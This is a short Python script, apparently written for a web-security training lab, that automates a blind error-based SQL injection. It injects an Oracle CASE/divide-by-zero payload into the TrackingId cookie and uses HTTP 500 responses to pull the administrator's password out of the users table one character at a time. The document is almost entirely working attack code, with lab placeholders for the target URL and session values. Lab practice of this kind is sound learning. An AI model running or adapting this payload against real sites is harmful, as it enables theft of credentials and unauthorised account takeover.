import requests
import string

chars = string.ascii_lowercase+string.digits
url='YOUR_LAB_URL'
password=""
counter=1
while True:
    for char in chars:
        with requests.session() as sess:
            r = sess.get(url, cookies={
                "TrackingId":f"YOUR_TRACKING_ID'||(select+case+when((select+substr(password,{counter},1)+from+users+where+username='administrator')='{char}')+then+to_char(1/0)+else+NULL+end+from+dual)||'",
                "session":"YOUR_SESSION"
            })
        if(r.status_code==500):
            password+=char
            counter+=1
            print(password)
    if(len(password) == 20):
        break
